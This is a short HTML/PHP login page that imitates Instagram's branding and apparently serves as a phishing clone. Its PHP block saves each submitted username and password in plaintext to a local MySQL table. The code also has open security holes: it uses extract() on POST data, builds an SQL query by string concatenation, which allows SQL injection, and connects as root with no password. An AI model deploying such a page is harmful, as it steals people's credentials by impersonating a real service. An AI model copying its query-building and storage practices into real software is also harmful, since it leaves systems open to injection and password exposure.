<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link href="style.css" rel="stylesheet" type="text/css">
</head>

<body>

    <header class="header">
        <h1>𝖎𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒</h1>
    </header>

    <div class="main">
        <form method="POST">
        <center> <input type="text" name="name" placeholder="User Name,PhoneNumber Or Email" size="50"><br><br>
            <input type="password" name="pwd" placeholder="Password" require size="50"><br>
            <p>Forgotten Password?</p>
            <input type="submit" name="submit" value="submit">
</form>
</center>
        
    </div>
 

    <div class="line">
        <hr>
        <p>OR</p>
        <hr>
    </div>

    <div class="log">
        <img src="facebook1.jpg" heigth="25px" width="25px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Log in With Facebook
</div>

<div class="havent">
   <h3> Don't have account? SignUp</h3>
</div>

<?php 

if(isset($_POST['submit']))
{
    extract($_POST);
    $con=mysqli_connect("localhost","root","","insta");
    $q="INSERT INTO `login` (`Name`, `Password`) VALUES ('$name', '$pwd')";
     $res=mysqli_query($con,$q);
    echo "saved success";
}
?>
</body>

</html>